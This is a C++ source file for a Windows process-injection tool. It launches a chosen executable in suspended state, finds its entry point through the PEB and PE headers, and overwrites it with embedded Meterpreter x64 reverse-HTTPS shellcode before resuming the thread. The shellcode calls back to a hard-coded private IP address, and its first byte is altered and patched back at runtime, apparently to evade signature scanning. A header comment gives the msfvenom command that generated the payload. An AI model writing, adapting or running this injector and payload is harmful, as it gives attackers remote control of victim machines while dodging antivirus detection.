// [Tech]InjectionWithOutVirtualAlloc.cpp :
// meterpreter : msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST <ip> LPORT <port> -e cmd/generic_sh -i 8 -f c
#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <tchar.h>

#pragma comment(lib, "ntdll")

#define EXIT_WITH_ERROR( e ) { fprintf(stderr,"*** %s Error=%d  *** \n", e, GetLastError() ); exit(-1); }


int _tmain(int argc, _TCHAR* argv[])
{
    if (argc > 1) {
        fprintf(stderr, "*** Hello in Injection without VirtualAllocEx ! \n");
    }
        
    else {
        fprintf(stderr, "*** Usage : [Tech]InjectionWithOutVirtualAlloc.exe <pathTarget.exe> \n");
        EXIT_WITH_ERROR("Missing an arg");
    }
      

    STARTUPINFO si;
    PROCESS_INFORMATION pi; 
    PROCESS_BASIC_INFORMATION pbi; 
    PEB peb;
    CONTEXT contextThread;
    DWORD returnLength = 0;
    LPVOID piba = 0, entryPoint = 0;
    BYTE headersBuff[4096];
    PIMAGE_DOS_HEADER pDosH;
    PIMAGE_NT_HEADERS pNtH;

    //meterpreter x64 
    unsigned char payload[] ="\xfd\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
                        "\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                        "\x8b\x52\x20\x4d\x31\xc9\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
                        "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                        "\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41\x51\x8b\x42\x3c\x48"
                        "\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b"
                        "\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x44\x8b"
                        "\x40\x20\x8b\x48\x18\x50\x49\x01\xd0\xe3\x56\x4d\x31\xc9\x48"
                        "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1"
                        "\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45"
                        "\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
                        "\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58"
                        "\x41\x58\x48\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48"
                        "\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
                        "\x4b\xff\xff\xff\x5d\x48\x31\xdb\x53\x49\xbe\x77\x69\x6e\x68"
                        "\x74\x74\x70\x00\x41\x56\x48\x89\xe1\x49\xc7\xc2\x4c\x77\x26"
                        "\x07\xff\xd5\x53\x53\x48\x89\xe1\x53\x5a\x4d\x31\xc0\x4d\x31"
                        "\xc9\x53\x53\x49\xba\x04\x1f\x9d\xbb\x00\x00\x00\x00\xff\xd5"
                        "\x49\x89\xc4\xe8\x1e\x00\x00\x00\x31\x00\x37\x00\x32\x00\x2e"
                        "\x00\x33\x00\x30\x00\x2e\x00\x31\x00\x30\x00\x37\x00\x2e\x00"
                        "\x31\x00\x35\x00\x33\x00\x00\x00\x5a\x48\x89\xc1\x49\xc7\xc0"
                        "\xbb\x01\x00\x00\x4d\x31\xc9\x49\xba\x46\x9b\x1e\xc2\x00\x00"
                        "\x00\x00\xff\xd5\xe8\xb6\x01\x00\x00\x68\x00\x74\x00\x74\x00"
                        "\x70\x00\x73\x00\x3a\x00\x2f\x00\x2f\x00\x31\x00\x37\x00\x32"
                        "\x00\x2e\x00\x33\x00\x30\x00\x2e\x00\x31\x00\x30\x00\x37\x00"
                        "\x2e\x00\x31\x00\x35\x00\x33\x00\x2f\x00\x48\x00\x44\x00\x4e"
                        "\x00\x50\x00\x48\x00\x6f\x00\x59\x00\x5f\x00\x30\x00\x5a\x00"
                        "\x65\x00\x48\x00\x4b\x00\x34\x00\x59\x00\x70\x00\x35\x00\x35"
                        "\x00\x39\x00\x6e\x00\x4c\x00\x51\x00\x68\x00\x56\x00\x33\x00"
                        "\x71\x00\x34\x00\x74\x00\x67\x00\x75\x00\x43\x00\x46\x00\x77"
                        "\x00\x7a\x00\x74\x00\x41\x00\x41\x00\x67\x00\x37\x00\x73\x00"
                        "\x4d\x00\x65\x00\x52\x00\x49\x00\x6d\x00\x6a\x00\x43\x00\x5f"
                        "\x00\x31\x00\x41\x00\x31\x00\x62\x00\x6e\x00\x35\x00\x68\x00"
                        "\x36\x00\x70\x00\x56\x00\x6f\x00\x59\x00\x4b\x00\x4a\x00\x6c"
                        "\x00\x5f\x00\x4a\x00\x66\x00\x6c\x00\x49\x00\x74\x00\x41\x00"
                        "\x75\x00\x30\x00\x36\x00\x72\x00\x49\x00\x76\x00\x54\x00\x7a"
                        "\x00\x61\x00\x36\x00\x4f\x00\x64\x00\x43\x00\x36\x00\x73\x00"
                        "\x78\x00\x43\x00\x74\x00\x6b\x00\x67\x00\x4a\x00\x2d\x00\x76"
                        "\x00\x65\x00\x75\x00\x52\x00\x41\x00\x67\x00\x53\x00\x61\x00"
                        "\x7a\x00\x74\x00\x45\x00\x2d\x00\x32\x00\x79\x00\x7a\x00\x4b"
                        "\x00\x36\x00\x68\x00\x6a\x00\x74\x00\x33\x00\x5f\x00\x67\x00"
                        "\x6f\x00\x6e\x00\x4c\x00\x55\x00\x69\x00\x47\x00\x37\x00\x34"
                        "\x00\x63\x00\x45\x00\x5f\x00\x44\x00\x4b\x00\x52\x00\x6b\x00"
                        "\x78\x00\x57\x00\x45\x00\x65\x00\x76\x00\x66\x00\x70\x00\x57"
                        "\x00\x31\x00\x31\x00\x65\x00\x2d\x00\x62\x00\x70\x00\x70\x00"
                        "\x78\x00\x79\x00\x35\x00\x43\x00\x44\x00\x75\x00\x75\x00\x35"
                        "\x00\x58\x00\x4f\x00\x54\x00\x69\x00\x6c\x00\x4e\x00\x49\x00"
                        "\x55\x00\x74\x00\x36\x00\x77\x00\x55\x00\x71\x00\x44\x00\x70"
                        "\x00\x75\x00\x59\x00\x53\x00\x71\x00\x59\x00\x36\x00\x75\x00"
                        "\x4c\x00\x65\x00\x76\x00\x45\x00\x50\x00\x6f\x00\x75\x00\x36"
                        "\x00\x6f\x00\x49\x00\x5f\x00\x30\x00\x49\x00\x31\x00\x4d\x00"
                        "\x71\x00\x4d\x00\x36\x00\x34\x00\x4d\x00\x00\x00\x48\x89\xc1"
                        "\x53\x5a\x41\x58\x4d\x89\xc5\x49\x83\xc0\x2c\x4d\x31\xc9\x53"
                        "\x48\xc7\xc0\x00\x01\x80\x00\x50\x53\x53\x49\xc7\xc2\x98\x10"
                        "\xb3\x5b\xff\xd5\x48\x89\xc6\x48\x83\xe8\x20\x48\x89\xe7\x48"
                        "\x89\xf9\x49\xc7\xc2\x21\xa7\x0b\x60\xff\xd5\x85\xc0\x0f\x84"
                        "\x6d\x00\x00\x00\x48\x8b\x47\x08\x85\xc0\x74\x3a\x48\x89\xd9"
                        "\x48\xff\xc1\x48\xc1\xe1\x20\x51\x53\x50\x48\xb8\x03\x00\x00"
                        "\x00\x03\x00\x00\x00\x50\x49\x89\xe0\x48\x83\xec\x20\x48\x89"
                        "\xe7\x49\x89\xf9\x4c\x89\xe1\x4c\x89\xea\x49\xc7\xc2\xda\xdd"
                        "\xea\x49\xff\xd5\x85\xc0\x74\x2d\xeb\x12\x48\x8b\x47\x10\x85"
                        "\xc0\x74\x23\x48\x83\xc7\x08\x6a\x03\x58\x48\x89\x07\x49\x89"
                        "\xf8\x6a\x18\x41\x59\x48\x89\xf1\x6a\x26\x5a\x49\xba\xd3\x58"
                        "\x9d\xce\x00\x00\x00\x00\xff\xd5\x6a\x0a\x5f\x48\x89\xf1\x6a"
                        "\x1f\x5a\x52\x68\x00\x33\x00\x00\x49\x89\xe0\x6a\x04\x41\x59"
                        "\x49\xba\xd3\x58\x9d\xce\x00\x00\x00\x00\xff\xd5\x4d\x31\xc0"
                        "\x53\x5a\x48\x89\xf1\x4d\x31\xc9\x53\x53\x53\x53\x49\xba\x95"
                        "\x58\xbb\x91\x00\x00\x00\x00\xff\xd5\x85\xc0\x75\x0c\x48\xff"
                        "\xcf\x74\x02\xeb\xbb\xe8\x68\x00\x00\x00\x48\x89\xf1\x53\x5a"
                        "\x49\xc7\xc2\x05\x88\x9d\x70\xff\xd5\x85\xc0\x74\xe9\x53\x59"
                        "\x6a\x40\x5a\x49\x89\xd1\xc1\xe2\x10\x49\xc7\xc0\x00\x10\x00"
                        "\x00\x49\xba\x58\xa4\x53\xe5\x00\x00\x00\x00\xff\xd5\x48\x93"
                        "\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\x00"
                        "\x20\x00\x00\x49\x89\xf9\x49\xc7\xc2\x6c\x29\x24\x7e\xff\xd5"
                        "\x48\x83\xc4\x20\x85\xc0\x0f\x84\x9f\xff\xff\xff\x66\x8b\x07"
                        "\x48\x01\xc3\x85\xc0\x75\xd1\x58\xc3\x58\x6a\x00\x59\x49\xc7"
                        "\xc2\xf0\xb5\xa2\x56\xff\xd5";

    char byte[] = "\xfc";

    ZeroMemory(&si, sizeof(STARTUPINFO));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&pbi, sizeof(PROCESS_BASIC_INFORMATION));
    ZeroMemory(&contextThread, sizeof(CONTEXT));
    
    //if (!CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &si, &pi))
    
    if (!CreateProcessW(argv[1], NULL, 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &si, &pi))
        EXIT_WITH_ERROR("/!/ Error CreateProcessW ! ");

    fprintf(stderr, "*** Step 1 :  CreateProcess in suspended succeeded ! *** \n");

    /* Get target image PEB address */
 
    contextThread.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &contextThread))
        EXIT_WITH_ERROR("/!/ GetThreadContext failed !");

    if(!ReadProcessMemory(pi.hProcess, (LPCVOID)contextThread.Rdx, (LPVOID)&peb, sizeof(peb), NULL))
        EXIT_WITH_ERROR("/!/ Error with ReadProcessMemory peb") ;
  
    /* Get target PIBA */

    fprintf(stderr, "Piba = %p \n", peb.Reserved3[1]);

    piba = peb.Reserved3[1];

    /* Read target process image headers */

    if (!ReadProcessMemory(pi.hProcess, (LPCVOID)piba, headersBuff, 4096, NULL))
        EXIT_WITH_ERROR("/!/ Error readprocessmemory Headers");

    /* Get addressOfEntryPoint */

    pDosH = (PIMAGE_DOS_HEADER)headersBuff;
    pNtH  = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuff + pDosH->e_lfanew);

    fprintf(stderr, "pNth entry point : %p \n", pNtH->OptionalHeader.AddressOfEntryPoint);

    entryPoint = (LPVOID) ((DWORD64)peb.Reserved3[1] + (pNtH->OptionalHeader.AddressOfEntryPoint));
    if (!entryPoint)
        EXIT_WITH_ERROR("Error entrypoint ! ");

    fprintf(stderr, " entry point = %x \n", entryPoint);

    /* Write shellcode to image entry */
    fprintf(stderr, "*** STEP 2 : WriteProcess ***\n");
    
    system("pause");

    memcpy(payload, byte, 1);

    if(!WriteProcessMemory(pi.hProcess, entryPoint, payload, sizeof(payload), NULL))
        EXIT_WITH_ERROR("/!/ WriteProcessMemory payload failed ! ");



    /* Restart thread */
    fprintf(stderr, "*** STEP 3 : Resume thread ***\n");
    
    system("pause");

    ResumeThread(pi.hThread);
    
    fprintf(stderr, "Goodbye ! \n");

}
